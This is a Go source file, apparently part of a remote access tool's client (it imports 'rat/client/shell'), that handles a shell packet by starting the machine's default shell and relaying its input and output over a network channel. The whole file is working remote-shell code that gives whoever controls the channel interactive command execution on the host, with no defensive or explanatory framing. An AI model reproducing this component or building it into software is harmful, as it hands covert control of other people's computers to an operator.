package main

import (
	"bufio"
	"fmt"
	"io"
	"os/exec"
	"rat/client/shell"
)

type ShellPacket struct {
	Action int    `network:"receive"`
	Data   string `network:"send,receive"`
}

var current struct {
	process *exec.Cmd
	stdin   io.WriteCloser
	stdout  io.ReadCloser
}

func (packet ShellPacket) Open(channel io.ReadWriteCloser, c *Connection) error {
	current.process = exec.Command(shell.GetDefault())
	current.stdin, _ = current.process.StdinPipe()
	current.stdout, _ = current.process.StdoutPipe()
	current.process.Start()

	current.stdin.Write([]byte("echo hello world\n"))

	defer current.process.Process.Kill()
	defer channel.Close()

	go func() {
		r := bufio.NewReader(current.stdout)
		b := make([]byte, 1024)
		for {
			n, err := r.Read(b)
			fmt.Println("stdin", n, err, string(b[:n]))
			if err != nil {
				break
			}
			_, err = channel.Write(b[:n])
			if err != nil {
				fmt.Println("failed writing to channel", err)
				break
			}
		}
	}()

	r := bufio.NewReader(channel)
	b := make([]byte, 1024)
	for {
		n, err := r.Read(b)
		fmt.Println("channel in", n, err, string(b[:n]))
		if err != nil {
			break
		}
		_, err = current.stdin.Write(b[:n])
		if err != nil {
			fmt.Println("error writing to process", err)
			break
		}
	}

	fmt.Println("end")

	return nil
}
